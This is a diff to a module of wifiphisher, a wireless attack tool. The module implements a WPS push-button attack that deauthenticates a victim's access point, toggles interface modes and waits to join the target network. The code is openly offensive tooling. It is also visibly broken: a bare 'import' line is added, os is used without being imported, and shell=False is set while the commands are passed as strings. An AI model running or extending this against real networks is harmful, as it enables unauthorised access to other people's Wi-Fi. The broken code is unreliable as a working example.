@@ -1,4 +1,5 @@
 from wifiphisher.common.constants import *
+import
 import time, threading, socket, fcntl, struct, subprocess
 
 
@@ -53,7 +54,7 @@ class Manage(object):
             #pay attention to this order when you create an attack because this is the
             #the order that you're gonna recieve as parameter in your attack.
             #see WPS_PBC as example
-            self.needs = ["deauth-object", "deauth_iface", "target_bssid"]
+            self.needs = ["deauth-object", "deauth_iface", "target_bssid", "network_manager"]
 
         return self.needs
 
@@ -97,7 +98,7 @@ class WPS_PBC(object):
         Taking self.bssid, self.iface and self.deauth from Load()
         """
 
-        self.deauth, self.iface, self.bssid = needs[0], needs[1], needs[2]
+        self.deauth, self.iface, self.bssid, self.network_manager = needs[0], needs[1], needs[2], needs[3]
         self.conf_dir = "/etc/wpa_supplicant.conf"
         self.log_file = log_file
 
@@ -129,8 +130,8 @@ class WPS_PBC(object):
 
         """Launching the commands"""
 
-        subprocess.Popen([sup], shell=True)
-        subprocess.Popen([wpa_set], shell=True)
+        subprocess.Popen([sup], shell=False)
+        subprocess.Popen([wpa_set], shell=False)
 
     def start_listen(self):
 
@@ -145,8 +146,7 @@ class WPS_PBC(object):
         time.sleep(7) #give some time to the AP to come back
 
         self.check = threading.Thread(target=self.check_if_connected)
-        cli = subprocess.Popen(self.wpa_cli, shell=True, stdout=subprocess.PIPE, \
-                                stdin=subprocess.PIPE, stderr=subprocess.PIPE) #start the wps listener
+        cli = subprocess.Popen(self.wpa_cli, shell=False) #start the wps listener
         self.check.start() #start checking if we are connected
 
     def stop_deauth(self):
@@ -154,8 +154,8 @@ class WPS_PBC(object):
         """
         Stop deauthenticating
         """
-        #TODO : WE NEED TO CHANGE THE IFACE TO managed IN ORDER TO CONNECTED
-        #TO THE VICTIM'S AP
+
+        self.network_manager.set_interface_mode(self.iface, "managed")
         self.deauth.stop_deauthentication()
 
     def deauth_rest(self):
@@ -164,6 +164,7 @@ class WPS_PBC(object):
         Restart the deauthentication
         """
 
+        self.network_manager.set_interface_mode(self.iface, "monitor")
         self.deauth.deauthenticate()
 
     def iface_up(self):
@@ -182,34 +183,13 @@ class WPS_PBC(object):
         """
 
         while 1:
-            ip = self.check_ip() #check if we got an ip from the AP
-            if not ip:
+            conn = self.check_ap() #check if we got an ip from the AP
+            if not conn:
                 time.sleep(1)
             else :
                 self.done()
 
-    #def timer(self):
-
-    #    """
-    #    This timer counts how many seconds passed
-    #    from the start point, it checks if it's been more
-    #    than two mins and if we are connected to the
-    #    victim's AP.
-    #    If it's been 2 mins or more stop everything.
-    #    """
-
-    #    secs = 0
-    #    while secs < 120 : #while it's been less than 2mins
-    #        ip = self.check_ip() #check if we got an ip from the AP
-    #        if not ip:
-    #            time.sleep(1)
-    #            secs += 1.2
-    #        else :
-    #            self.done() #if we did we're done
-    #    self.stop() #it's been more than 2mins
-
-
-    def check_ip(self):
+    def check_ap(self):
 
         """
         Returns the ip that we got or a False if
@@ -217,22 +197,27 @@ class WPS_PBC(object):
 
         :param self: A WPS_PBC object
         :type self: WPS_PBC
-        :return: False or the ip we got
-        :rtype: bool or string
+        :return: True : Got an IP and connected to the right AP
+                 False : Didn't get an IP or wrong AP ( XD )
+        :rtype: bool
         """
-        #TODO : THIS IS NOT THE RIGHT WAY BECAUSE THE DEAUTH iface
-        #WILL STILL BE CONNECTED WITH THE FAKE IP, SO IF WE WANNA USE
-        #THIS METHOD WE NEED TO FIRST DISCONNECT FROM THE FAKE ONE FIRST
-        #AND ALSO CHECK THAT WE ARE CONNECTED TO THE RIGHT ONE ( ROUTE IS ENOUGH )
+
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         while 1:
             try :
-                ip = socket.inet_ntoa(fcntl.ioctl(
+                ip = socket.inet_ntoa(fcntl.ioctl( #checking if we got an ip from the target AP
                     s.fileno(),
                     0x8915,
                     struct.pack('256s', self.iface[:15])
                 )[20:24])
-                break
+                #check the identity of the AP we are connected to
+                conn_ap = (os.popen("iwconfig "+self.iface+" 2> /dev/null | awk -F\Access"
+                                    "'{print $2}'").read()).strip("Point: \n")
+                if conn_ap == self.bssid :
+                    break
+                else :
+                    self.error = "WPS is now connected, but to the wrong AP. AP connected : "+conn_ap
+                    raise AttackError(self.error)
             except IOError as e:
                 if e.errno == 99:  #if we didn't get the ip return False
                     return False
@@ -241,7 +226,7 @@ class WPS_PBC(object):
                     continue
                 else :
                     return False
-        return ip #return the ip we got
+        return True
 
 
 
@@ -285,16 +270,16 @@ class DidNotProvide(Exception):
                     str(needs))
 
         Exception.__init__(self, message)
-class AttackAlreadyRunning(Exception):
+
+class AttackError(Exception):
 
     """
-    Exception class to raise if an attack is already running
+    Exception class to raise if an attack has an error
     """
 
-    def __init__(self):
+    def __init__(self, error):
 
-        message = ("An attack is currently running, you can't have"
-                    "more than one attack running at the same time!\n")
+        message = ("Attack error incurred : "+error)
 
         Exception.__init__(self, message)
 
@@ -313,3 +298,25 @@ class NotValidAttack(Exception):
                     "a valid attack")
 
         Exception.__init__(self, message)
+
+
+
+    #def timer(self):
+
+    #    """
+    #    This timer counts how many seconds passed
+    #    from the start point, it checks if it's been more
+    #    than two mins and if we are connected to the
+    #    victim's AP.
+    #    If it's been 2 mins or more stop everything.
+    #    """
+
+    #    secs = 0
+    #    while secs < 120 : #while it's been less than 2mins
+    #        ip = self.check_ip() #check if we got an ip from the AP
+    #        if not ip:
+    #            time.sleep(1)
+    #            secs += 1.2
+    #        else :
+    #            self.done() #if we did we're done
+    #    self.stop() #it's been more than 2mins
